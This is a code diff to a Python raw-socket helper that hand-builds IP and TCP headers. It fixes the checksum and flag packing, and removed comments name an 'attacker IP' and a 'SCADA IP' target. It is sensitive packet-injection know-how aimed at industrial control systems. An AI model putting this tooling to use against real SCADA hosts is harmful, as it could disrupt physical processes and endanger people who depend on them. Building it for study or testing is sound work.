@@ -91,7 +91,8 @@ def _build_ip_header(src_ip: str, dst_ip: str, payload_len: int) -> bytes:
 
 
 def _build_tcp_header(src_port: int, dst_port: int, seq: int, ack: int,
-                       flags: int, payload: bytes) -> bytes:
+                       flags: int, payload: bytes,
+                       src_ip: str = "10.0.0.66", dst_ip: str = "10.0.0.100") -> bytes:
     """Build a minimal TCP header with data offset and checksum."""
     import struct
     data_offset = 5  # 5 * 4 = 20 bytes
@@ -100,20 +101,20 @@ def _build_tcp_header(src_port: int, dst_port: int, seq: int, ack: int,
     urgent = 0
     header = struct.pack(">HHIIBBHHH",
         src_port, dst_port, seq, ack,
-        (data_offset << 4) | flags, window, checksum, urgent)
+        (data_offset << 4), flags, window, checksum, urgent)
     # Pseudo-header for checksum
-    src_bytes = socket.inet_aton("10.0.0.66")  # attacker IP
-    dst_bytes = socket.inet_aton("10.0.0.20")  # SCADA IP
+    src_bytes = socket.inet_aton(src_ip)
+    dst_bytes = socket.inet_aton(dst_ip)
     pseudo = struct.pack(">4s4sBBH", src_bytes, dst_bytes,
                           0, 6, len(header) + len(payload))
     s = sum(struct.unpack("!%dH" % ((len(pseudo) + len(header) + len(payload) + 1) // 2),
-             pseudo + header + payload + b'\x00'))
+             pseudo + header + payload + b'\x00' * (len(payload) % 2)))
     s = (s >> 16) + (s & 0xFFFF)
     s += s >> 16
     checksum = ~s & 0xFFFF
     header = struct.pack(">HHIIBBHHH",
         src_port, dst_port, seq, ack,
-        (data_offset << 4) | flags, window, checksum, urgent)
+        (data_offset << 4), flags, window, checksum, urgent)
     return header
 
 
@@ -124,9 +125,8 @@ def _send_raw_tcp(sock, dst_ip: str, src_ip: str, dst_port: int, payload: bytes)
     src_port = random.randint(1024, 65535)
     seq = random.randint(0, 2**32 - 1)
     ack = 0
-    flags = 0x02  # SYN (but we just need to send data, use PSH|ACK)
     flags = 0x18  # PSH | ACK
-    tcp_header = _build_tcp_header(src_port, dst_port, seq, ack, flags, payload)
+    tcp_header = _build_tcp_header(src_port, dst_port, seq, ack, flags, payload, src_ip=src_ip, dst_ip=dst_ip)
     ip_header = _build_ip_header(src_ip, dst_ip, len(tcp_header) + len(payload))
     sock.sendto(ip_header + tcp_header + payload, (dst_ip, 0))
 
